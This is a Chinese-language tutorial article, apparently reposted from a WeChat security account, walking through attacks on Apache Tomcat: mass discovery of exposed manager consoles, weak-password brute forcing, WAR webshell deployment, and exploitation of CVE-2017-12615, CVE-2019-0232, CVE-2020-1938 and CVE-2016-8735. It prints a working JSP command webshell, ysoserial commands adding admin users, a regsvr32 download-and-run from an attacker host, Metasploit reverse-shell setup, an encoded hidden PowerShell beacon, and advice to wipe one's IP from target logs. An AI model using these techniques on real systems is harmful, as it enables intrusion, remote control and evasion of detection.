> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iTWctaWSgBnNqeEYgEDUzQ)

Tomcat 服务器是一个开源的轻量级 Web 应用服务器，在中小型系统和并发量小的场合下被普遍使用。主要组件：服务器 Server，服务 Service，连接器 Connector、容器 Container。连接器 Connector 和容器 Container 是 Tomcat 的核心。一个 Container 容器和一个或多个 Connector 组合在一起，加上其他一些支持的组件共同组成一个 Service 服务，有了 Service 服务便可以对外提供能力了。对外提供服务的同时，部分低版本 tomcat 却存在漏洞，漏洞被利用导致服务被攻击造成极大破坏。

Tomcat 目录结构：
------------

bin：二进制文件

lib：全局的 jar 包

temp：临时性文件

webapps：Java 的 web 项目，需要部署的项目就要放在这个目录中

work：JSP 代码翻译的 Java 代码以及编译的. class 文件

了解 Tomcat：
----------

server.xml：配置 tomcat 启动的端口号、host 主机、context 等

web.xml：部署描述文件，部署每个 webapp 时都会调用该文件，配置该 web 应用的默认 servlet

tomcat-user.xml：tomcat 的用户密码和权限

###### 任意文件写入 (CVE-2017-12615)

### Tomcat 的几大高危漏洞

Tomcat 后台弱口令上传 war 包，tomcat 管理弱口令页面 getshell。

Tomcat 的 PUT 的上传漏洞 (CVE-2017-12615) ，tomcat put 方法任意文件上传 CVE-2017-12615。

Tomcat 反序列化漏洞 (CVE-2016-8735) ，tomcat 反序列化漏洞 CVE-2016-8735。

Tomcat 样例目录 session 操控漏洞，Apache Tomcat examples directory vulnerabilities(Apache Tomcat 样例目录 session 操纵漏洞。

Tomcat 本地提权漏洞 (CVE-2016-1240)，Tomcat 本地提权漏洞分析与防御。

Tomcat 漏洞列表

Apache Tomcat 拒绝服务漏洞 CVE-2014-0230  
Apache Tomcat Manager 和 Host Manager 应用程序安全漏洞 (CVE-2015-5351)  
Apache Tomcat session-persistence 远程代码执行漏洞 (CVE-2016-0714)  
Apache Tomcat 会话固定漏洞 (CVE-2015-5346)  
Apache Tomcat 远程代码执行漏洞 (CVE-2016-8735)  
Apache Tomcat Commons Fileupload 拒绝服务漏洞 (CVE-2016-3092)  
Apache Tomcat httpoxy 安全漏洞 (CVE-2016-5388)  
Apache Tomcat 安全绕过漏洞 (CVE-2016-6816)  
Apache Tomcat AJP 协议安全绕过漏洞  
Apache Tomcat 安全绕过漏洞 (CVE-2012-3439)  
Tomcat 拒绝服务漏洞 (CVE-2014-0050)  
Apache Tomcat 安全漏洞 (CVE-2017-6056)  
Apache Tomcat 安全漏洞 (CVE-2017-5648)  
Apache Tomcat Default Servlet 安全漏洞 (CVE-2017-5664)  
Tomcat 信息泄露漏洞 (CVE-2017-12616)  
Apache Tomcat 安全漏洞 (CVE-2017-12617)  
Apache Tomcat 安全漏洞 (CVE-2017-5647)  
Apache Tomcat 安全漏洞 (CVE-2018-1304)  
Apache Tomcat 安全漏洞 (CVE-2018-1305)

如何快速发现目标的各类 tomcat 管理控制台入口
==========================

第一种, 通过常规端口扫描, 获取服务 banner

# nmap -n -sT -Pn --open -v -p 8080-8090,8443 -sV 192.168.3.100-200

tomcat 的默认端口通常情况下都会在这个区间内, 至于具体用什么扫无所谓, masscan,zmap 都一样, 只不过 nmap 会识别的更精准

第二种, 通过各类外部 web 搜索引擎进行批量抓取

inurl:/manager/html intitle:apache tomcat site:*.target.*    Tomcat 控制台的默认路径 / manager/html。也可以只找特定版本的 tomcat。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKStJ9ypY5ZoibEoibCCOnmQZVicJicmI2LtmQxzxonZa7Abp8doiaqNoGwfg/640?wx_fmt=jpeg)

第三种, 通过各类空间搜索引擎进行批量抓取

shodan，zoomeye，fofa，censys......

net:"112.112.0.0/16" port:"8080" product:"Apache Tomcat/Coyote JSP engine" 可先获取它的 as 号，然后再根据 as 号查到的网段，批量抓 tomcat 入口

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKWWEgMEyVxeIVvotKSKMuubrTCLpBps7d4QWtjY6B5aM97HeckQmqng/640?wx_fmt=jpeg)

探测发现后, 想办法利用
============

先从低版本 tomcat 管理控制台进行弱口令爆破 tomcat-6.0.9，在 7.x 后的版本加入了防暴力破解，所以针对 tomcat 7.x 以后的版本不用考虑爆破。

先添加好 tomcat 控制台角色用户到 tomcat-users.xml 文件的 <tomcat-users> 标签内添加如下用户。

配置完之后, 运行 startup.bat 脚本即可启动 tomcat 服务

<role role/>

<role role/>

<user user/>

爆破的方式很多，可以利用 msf tomcat_mgr_login 爆破 / 自行写脚本 / burpsuite，请求的时候要先把账号密码 base64encode。至于常见的弱口令可以去 github 找。

爆破会在目标的 web 访问日志中留下大量的请求记录，当搞定进入对方机器之后，要把把自己 ip 的所有请求日志都清除掉。

通上面过程，如果登录到目标 tomcat manager，接下来就是想办法利用 tomcat 默认管理控制台自动 war 包部署功能，部署我们的 webshell 了。

影响范围：  
Tomcat 7.0.0~7.0.81(默认配置)  
1）、使用 vulhub 环境进行复现  
原理：配置不当，导致将 conf/web.xml 中的 readonly 设置为 false, 导致可以使用 PUT 上传任意文件，但限制 jsp 后缀。不同平台有多种的绕过方法。  
复现环境：Tomcat 8.5.19  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKesYZ01yfuSyEP1NVk6Nw3FCo1SS9HHib6q6Ss6iaiaz9hBCE50A45aFEw/640?wx_fmt=jpeg)  
docker exec -ti bash  
cat conf/web.xml |grep readonly

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKaEqewyrx2MPBV7EicKL4rPsD9bGczePM13ZaFqXyrSmVOAtm3gttL8g/640?wx_fmt=jpeg)  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKsuICdcM4sBQyTXtp4KYhTKFQmx9FbuHhc40loKibIKn0wbGd4kDrbGg/640?wx_fmt=jpeg)  
2）、绕过上传 jsp  
1.windows 下不允许文件以空格结尾，上传到 windows 会自动去掉末尾空格。  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKODTQSAR79qiciabP1aQDnL4xwgicaa78iacvGc4OOYGH9j4mCGiaBuu6pjQ/640?wx_fmt=jpeg)  
2.WindosNTFS 流  
文件后缀加上::$DATA  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKZbWcIAIxyI7ibz2pshTXXDr6fRv17l7nX36iaPkrTcnLkzWHOL1gQuIA/640?wx_fmt=jpeg)  
3./ 在文件名中是非法的，会被去除 (Windows/Linux)  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKiaHvxQ9OoXE2aiaAlHA3hlicAqAGaebee0IvEAOgKO8FcNMdy3CU59PUA/640?wx_fmt=jpeg)  
三种方法都成功上传。  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKbiaFESXec5icFpe0siaUOkOpHT20u21vtHCwzbT91JYvWzUrjnpN8qDgw/640?wx_fmt=jpeg)

修复建议：  
readonly 改为 true

远程代码执行 (CVE-2019-0232)  
影响范围:  
Tomcat 9.0.0.M1~9.0.17  
Tomcat 8.5.0~8.5.39  
Tomcat 7.0.0~7.0.93  
复现环境: 9.0.17  
前提: Tomcat 的 CGI_Servlet 组件默认是关闭的，在 conf/web.xml 中找到注释的部分，去掉注释，并配置 enableCmdLineArguments 和 executable。  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKnAK9FibI2x6hcXqy7ibgIRPJ15UKRrPcdAh2tjc17yUmBg2veQEUeqoA/640?wx_fmt=jpeg)  
找到以上部分代码去掉注释，并加入红框内容。  
enableCmdLineArguments 启用后会将 url 中的参数传递到命令行。  
executable 指定执行的二进制文件，默认是 perl，需要置为空才会执行文件本身。

启用 cgi 的 servlet-mapping  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKTWL1fzX7IzFJxWxyj5323sNBibcYg5WfbhQviasicv6R426ls9ya1OB6g/640?wx_fmt=jpeg)

修改 conf/context.xml，添加 privileged=”true” 属性，否则会没有权限。  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKL2b2ibnZibVAvZvQq7s4KDTo1jZsIiaT2huwXkwaia1D3p6NfzcgBLUEWQ/640?wx_fmt=jpeg)

在 tomcat\webapps\ROOT\WEB-INF 下创建 cgi-bin 目录，在该目录下创建一个 bat 文件，随后填写任意内容即可。  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKIicyIianzxMbg6qrSiaPu4ZqUUq2IiazK9iaOMBPyUC4xfTzUMN2yNkk6uA/640?wx_fmt=jpeg)  
修复建议：  
1、更新版本。  
2、禁用 enableCmdLineArguments 参数。

###### AJP 文件包含漏洞分析 (CVE-2020-1938)

影响版本：  
Tomcat 6.x  
Tomcat 7.x <7.0.100  
Tomcat 8.x <8.5.51  
Tomcat 9.x <9.0.31

漏洞危害：如果目标应用有文件上传的功能，配合文件包含的利用可以达到远程代码执行的危害。  
影响说明: 读取 webapp 下所有文件  
漏洞成因:tomcat 部署时有两个重要的配置文件 conf/server.xml 和 conf/web.xml。  
前者定义了 tomcat 启动时设计的组件属性，包含两个用于处理请求的组件 connector。如果开启状态下，tomcat 启动后会监听 8080、8009 端口，它们负责接受 http、ajp 协议的数据。  
后者用来定义 servlet。  
漏洞复现 - 利用 POC 攻击:  
安装好环境后执行  
python 1.py 192.168.109.149 -p 8009 -f /WEB-INF/web.xml  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKqicGKgV2tySfxQGMtnUmL0Nfwojeicex0XUB3oAAcVZVMckzcPvEQnuw/640?wx_fmt=jpeg)  
成功读取到 / WEB-INF/web.xml 文件的源码

漏洞复现 - 文件包含 RCE:  
该漏洞可以任意文件类型解析为 jsp，从而达到任意命令执行的效果。但漏洞需要配合文件上传漏洞利用。  
首先生成 bash payload  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPK63jFMyvahvzaibibDNYAehJxzIVf2pWpzNCU5hMmu5km9icabP3I8h2WA/640?wx_fmt=jpeg)  
最终的 payload 为 txt 文件：  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKMqm6nnJ415P8VZXFykdcXgVjuVVnAZtBsUJx6Kwe8uL8NicV4oGtrFg/640?wx_fmt=jpeg)  
上传到目标服务器，然后 kali 开启监听。  
python 1.py ip -p 8009 -f RCE.txt  
该漏洞可以和 war 上传联动。

###### Tomcat 弱口令 & 后台 getshell

1）、在 conf/tomcat-users.xml 文件中配置用户的权限：

```
https://www.freebuf.com/articles/paper/253666.html

本文作者：stan1ey， 转载请注明来自FreeBuf.COM
https://www.freebuf.com/articles/web/271892.html
本文作者：Pupa， 转载请注明来自FreeBuf.COM
```

2）、改 conf\Catalina\localhost 路径下的 manager.xml 文件，如果该路径下没有此文件，可以新建一个。内容如下：

```
<Context privileged="true" antiResourceLocking="false" 
 docBase="${catalina.home}/webapps/manager"> 
 <Valve class^.*$" /> 
</Context>
```

3）、成功创建和添加以上内容，允许远程访问该 manager。  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKTeiaLWPJWBr9ZDc7jib0ibSgEKZicVajqqIiaJAhhkQ3jGNqwibWs45hQKQg/640?wx_fmt=jpeg)  
使用 tomcat/tomcat 登录，访问正常。

4）、本地 getshell 复现  
（1）、正常安装的情况下，tomcat 版本中默认没有任何用户，且 manager 页面只允许本地 IP 访问。只有管理员手工修改了这些属性才能进行攻击。  
（2）、文件上传 war 包。  
war 包简介：  
war 包是用来进行 Web 开发时一个网站项目下的所有代码，包括前台 HTML/CSS/JS 代码，以及后台 JavaWeb 的代码。当开发人员开发完毕就会将源码打包给测试员测试，测试完毕也会打包成 War 包进行发布。War 包可以放在 Tomcat 下的 webapps 或 word 目录，当 Tomcat 服务器启动时，War 包即会随之解压源代码来进行自动部署。  
（3）、生成 war 大马包  
使用 java 命令:  
jar -cvf shell.war shell.jsp

查看上传位置：  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKAYRHBSPne06PfZ0KLLQM5nTcK1JsvTicRQCjlkIrc43FMoicQfkpiaHJQ/640?wx_fmt=jpeg)  
成功解析大马并能实现 upload 功能：  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKjCbhujBwx52vgTsXljxHwsHulyMKnO7wq9LcxkPrrVvwvC2LhLP5mw/640?wx_fmt=jpeg)  
5）、上传冰蝎 jsp 木马  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKicegPYQ1OibwFyK6gXEO8nG0MaGcTQt8fiaIkKVtSAmRhl9mYuqkrwDSg/640?wx_fmt=jpeg)  
本地检查成功上传：  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKFpicuicU4GWHxDW3LnnYxjQg72JcTk0foPibJG2HEo2RhoDLf8lhXQs1A/640?wx_fmt=jpeg)  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKFzrvVrjZuWg487k6HRLxN3wJMsOhkvot9tEZWBZNA0tMfHPCxHUibTA/640?wx_fmt=jpeg)  
此处关闭机场和代理，否则冰蝎会默认走导致无法上线。  
6）、MSF 上线控制  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPK0OgfQFgXTosZo2m6kvylqrFy4MWibJD9dPPzr6GaFcZhrgU4ibOWXfgw/640?wx_fmt=jpeg)  
完成 shell 控制。  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPK4AdNstZeI8icHLXgEQdQwY27pLY21Z5ZmFYLp0fsQgIF9t2LicHNdd3Q/640?wx_fmt=jpeg)

这次我们用 tomcat 9.0.10 来进行演示

注意, 可能是 tomcat 官方为了安全起见, 在 tomcat8.x 之后版本的 manager 默认可能已经不再允许直接远程访问了, 只允许本地访问, 这也就是为什么有时候, 你在访问目标的 manager/html 会出现 403 的情况

webapps\manager\META-INF\context.xml 文件

<Context antiResourceLocking="false" privileged="true">

<Valve class

allow="\d+\.\d+\.\d+\.\d+" /> 此正则表示允许任意地址访问

添加管理控制台角色用户 tomcat-users.xml 文件：

<role role/>   
<role role/>   
<user user/>

环境搭建好之后，我们就可以来看看如何部署自己的 war 包 webshell 了，寻找 manager 中用于部署 war 包的上传点，然后上传自己的 war 包，至于你的 war 包 webshell 是一句话 / 大马 / meterpreter 自己随意。

命令执行利用的 webshell 为例，就两参数一个传命令一个给密码然后循环把执行结果打出来。

java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cr")).getInputStream();  
int a = -1;  
byte[] b = new byte[1024];  
while((a=in.read(b))!=-1)  
{   
out.println(new String(b));  
}

如下则是 war 包 webshell 的简单制作过程

# jar -cvf Readme.war Readme.jsp

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKhdibHw1vEMDLB6ic1xBQ9tBvS2ic3bRXGRms8LzPNPoxzyqokmmMxwARA/640?wx_fmt=jpeg)

上传制作好的 war 包 webshell，点击部署。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKibkmG1iczBvic8KjQ5GMVgMia6vULGIcB5ZcaNToJOkPXd0U85OicIblepA/640?wx_fmt=jpeg)

Tomcat 便会自动帮我们部署好并启动它, 如下

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPK4mEflDkbV2SRKC5GhMrADpNGscG1N6ib3rkZ1QfbFuVXtOQFTBrpECA/640?wx_fmt=jpeg)

在 POST 中带上密码和命令去访问自己的 webshell 地址，就可以看到执行结果。

POST: au=sk15&cr=ipconfig /all

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPK6jBvnpjeMP8VryeypYfAFm7q1SyDsVQm0R4lUH5cibh2Uic2rG994P7A/640?wx_fmt=jpeg)

关于防御:

war 包 webshell 部署并不算是漏洞，只是 tomcat 的一个正常功能被入侵者利用了。最根本的办法就是删掉 manager 目录，实际业务几乎也不大会用到 。另外，就是些加固型的防御手段，提高攻击门槛。加强登录口令 / web 访问日志实时监控爆破 / 借助系统防火墙拦截 / cc 防护...

CVE-2016-8735 远程代码执行利用过程 
=========================

漏洞影响 tomcat 版本，tomcat 8.0.36 为例:

Apache Tomcat 9.0.0.M1 to 9.0.0.M11

Apache Tomcat 8.5.0 to 8.5.6

Apache Tomcat 8.0.0.RC1 to 8.0.38

Apache Tomcat 7.0.0 to 7.0.72

Apache Tomcat 6.0.0 to 6.0.47

在 tomcat 中默认会使用 JmxRemoteLifecycleListener 这个监听器来监控 tomcat 平时的各种运行状态。

但 Oracle 在修复了 JmxRemoteLifecycleListener 反序列化漏洞 [CVE-2016-3427] 后，却忘记了及时对 tomcat 中的 jmx 监听器进行升级。

所以它本质还是 jmx 的漏洞并非 tomcat 自身漏洞。

实际上 JmxRemoteLifecycleListener 平时用来做监控居多，实际直接从外部碰到该端口的机会也并不是特别多。

漏洞利用过程

先搭建好基础环境，配置 JmxRemoteLifecycleListener 监听器。

而后编辑 conf\server.xml 文件添加如下的监听器

<table width="680"><tbody><tr><td width="1175"><p>&lt;Listener class /&gt;</p></td><td width="238"><p>端口可随意, 只要不冲突即可</p></td></tr></tbody></table>

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPK3mRVdSjM328vicwO4pJfZ8YMyA9FvSrzdmoiaZy5P8h15jHh4Bao7yWg/640?wx_fmt=jpeg)

之后, 再去编辑 bin\catalina.bat 文件，添加如下变量直接在 setlocal 下面开始添加。

语句的主要作用是方便别人远程连过来对此 jvm 进行监控，注意此处是没有启用用户认证。

set JAVA_OPTS=-Dcom.sun.management.jmxremote -Djava.rmi.server.hostname=192.168.x.x -Dcom.sun.management.jmxremote.port=1099 -Dcom.sun.management.jmxremote.authenticate=false -

Dcom.sun.management.jmxremote.ssl=false

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKM9MV9FTT9OIucgafSdgicQPdTaaICnJEjx9Y4BUWyOAJicVZS4MibUycQ/640?wx_fmt=jpeg)

执行 \ bin\startup.bat 脚本启动 tomcat

不妨先用 jvisualvm 连过去看看监控效果

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKFUQQP1L1zrs1SQWgjeWd0omBXLsSKl4VAVUiciaE4HFWiawIgbUiabQH2w/640?wx_fmt=jpeg)

, 我们肯定得先发现目标有这样的端口才行，通过 nmap 对指定的单个目标机器进行全端口扫描并尝试获取服务 banner。

# nmap -n -sT -sV -p 1-50000 --open -Pn -v 192.168.x.x

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPK8ljjy2XJZWlTNelQw0mibIsw3oXo1H4k3U6UC1jPtKiaiaJLmXMsUjyNg/640?wx_fmt=jpeg)

而后利用经典的 ysoserial java 反序列化 payload 工具，尝试直接在远程目标机器上执行系统命令。

# java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.x.x 10001 Groovy1 "cmd.exe /c net user flag"Admin!@#45"/add"

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPK1X2h1WwZLHRlUO2yVIEXnlUukbt56wKDfWY6eEYIyPOUj1FoR8zIpQ/640?wx_fmt=jpeg)

像上面这样执行系统命令，配合 msf 一起利用尝试弹回一个 meterpreter 的 shell。

msf5 > use exploit/multi/script/web_delivery msf5 > set target 3 msf5 

msf5 > use exploit/multi/script/web_delivery msf5 > set target 3 msf5 > set payload windows/meterpreter/reverse_tcp_rc4_dns msf5 > set lhost 192.168.3.7 msf5 > set lport 53 msf5 > set rc4password msf5 > exploit -j 此处借助 regsvr 32 来远程下载执行

执行过程中需要远程下载 payload 这就要求当前目标机器必须能正常通外网才行。

# java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.x.x 10001 Groovy1 "cmd.exe /c regsvr 32 /s /n /u /i:http://192.168.3.7:8080/CzVtq564v1ymsYr.sct scrobj.dll"

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKa1jriaBaKvrUsxBmUa14c0gzw4a5HRuWFJES3KGOCW3ibg0CSO0LsqNQ/640?wx_fmt=jpeg)

再直接尝试利用 powershell 尝试弹个 beacon 的 shell，先生成 ps 的 payload

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKEnNYFl0yBLibiaVuw5e0AxRAj1oCM3AjFJegBSricfqRKh7dmw0UGKvow/640?wx_fmt=jpeg)

而后, 继续通过 ysoserial.jar 发送执行该 payload

# java -cp ysoserial.jar  ysoserial.exploit.RMIRegistryExploit 192.168.x.x 10001 Groovy1 "cmd.exe /c powershell.exe -nop -w hidden -encodedcommand base64encode"

最后, 看到 beacon 正常上线

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKNbpUEaQdQ60N3of7Z6Y9k7O9T8GmjK8HG0GjT2snz2epkSGWjMdu0Q/640?wx_fmt=jpeg)

关于利用和防御所要注意的一些点:

上面的环境主要都是针对 windows, 至于 Linux 下的利用方法, 其实也大同小异, 只不过, 对于 windows 平台, shell 免杀的问题在实战中你可能还要多费点儿劲, 防御非常简单, 升级 tomcat 到已修补的版本即可

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS0Fcx9pLr3921r64R5WuPKQiaYdVuskwgrH7Ywjqfhp5suIl0lvypKsepXIMib4wMiaDyUHZrMoNLFw/640?wx_fmt=jpeg)

参考：

```
https://www.freebuf.com/articles/paper/253666.html
本文作者：stan1ey， 转载请注明来自FreeBuf.COM
https://www.freebuf.com/articles/web/271892.html
本文作者：Pupa， 转载请注明来自FreeBuf.COM
```

精彩推荐

  

  

  

  

  

  

  

加微信进群领资料

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONQ2fY6xicZTxbrVHiaNXichFA7aQqaIXuibUbYCg2ZnoNge8ltZHibPD2gAMEyrLySibcJzbChL2Olg674w/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONSgp1TKd5oeaGb76g5eMFibnANHNp30ic7NtpVnU12TNkBynw2ju7RDHbYtVZibm5rjDh7VKbAEyO8ZQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=1)

关注公众号

```
回复“电子书”获取web渗透、CTF电子书:

回复“视频教程”获取渗透测试视频教程;  

回复“内网书籍”获取内网学习书籍;        

回复“CTF工具”获取渗透、CTF全套工具;

回复“内网渗透”；获取内网渗透资料;

回复“护网”；获取护网学习资料 ;

回复“python”,获取python视频教程；

回复“java”，获取Java视频教程;

回复“go”，获取go视频教程




知识星球
```

【Hacking 藏经阁】知识星球致力于分享**技术**和**认知**。

**1、技术方面。**主攻渗透测试（web 和内网）、CTF 比赛、逆向、护网行动等；

400G 渗透教学视频、80 多本安全类电子书、50 个渗透靶场（资料主要来自本人总结、以及学习过程中购买的课程）

**2、认知方面。**副业经营、人设 IP 打造，具体点公众号运营、抖 * yin 等自媒体运营（目前主要在运营两个平台 4 个号）。

如果你也想像我一样，不想 35 岁以后被动的去面试，那么加入星球我们一起成长。

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONShDSbaaStARPj9t8BRl2VXW2KPDIpHmxTu739oehyYCWhyLbrBVKITv9Ric2l6n9ht6IicMHyibu60w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

_渗透实战系列_

  
  

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247521495&idx=1&sn=caac7e98e96267c6e24e740f1bcefd79&chksm=ce643e4ef913b7586a9525fe0ed4fa5e5b3114bc2d0fbc2b278387e860b1e55ca4c656adf70b&scene=21#wechat_redirect)[【渗透实战系列】50|- Log4j 打点后与管理员斗智斗勇](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247521495&idx=1&sn=caac7e98e96267c6e24e740f1bcefd79&chksm=ce643e4ef913b7586a9525fe0ed4fa5e5b3114bc2d0fbc2b278387e860b1e55ca4c656adf70b&scene=21#wechat_redirect)

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)[【渗透实战系列】49|- 实战某高校的一次挖矿病毒的应急处置](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247521254&idx=1&sn=608c7a604f2eb334aad40dd95c809950&chksm=ce64397ff913b069b5797aadd2933a14e79cb697a62924f0e5c0504a598d9926981f67702252&scene=21#wechat_redirect)

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)[【渗透实战系列】|48 - 一次内网渗透](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247519585&idx=1&sn=8e735123122be046abb6913394dd1ced&chksm=ce6427f8f913aeee76227bebd93b269fb060788b78251b46380329146e015b43526f919b7fb6&scene=21#wechat_redirect)

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)[【渗透实战系列】|47 - 记一次对某鱼骗子卖家的溯源](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247516996&idx=1&sn=8dcfdef2ead8421b959a76786ef16f46&chksm=ce6429ddf913a0cb7cb0f2b5a86adb47c4fd57e66891e72bf6d7fdd3e0e9783597707420df99&scene=21#wechat_redirect)

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)[【渗透实战系列】|46 - 渗透测试：从 Web 到内网](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)[【渗透实战系列】|45 - 记一次渗透实战 - 代码审计到 getshell](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247513971&idx=1&sn=44217ebfc753e30f582f2da6fccb5fb3&chksm=ce641deaf91394fc238288ccdc3e21c6ff68e0b47c6516c41c66540af284e0469d263f7270dc&scene=21#wechat_redirect)

▶[【渗透实战系列】|44 - 记一次授权渗透实战（过程曲折，Java getshell）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247513739&idx=1&sn=25095394da2aa3621f3c30227139514c&chksm=ce641c12f91395042bda813b5e7ac491c81daa97d51b8988b3d1bc192b52976135b99de45a6e&scene=21#wechat_redirect)

▶[【渗透实战系列】|43 - 某次通用型漏洞挖掘思路分享](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247512229&idx=1&sn=de5f7a7fe64b77b8843a48049a7775a8&chksm=ce641a3cf913932a21032b326c654300d5b7a5eff960c6a2e27398e35456aa05833bb5439a90&scene=21#wechat_redirect)

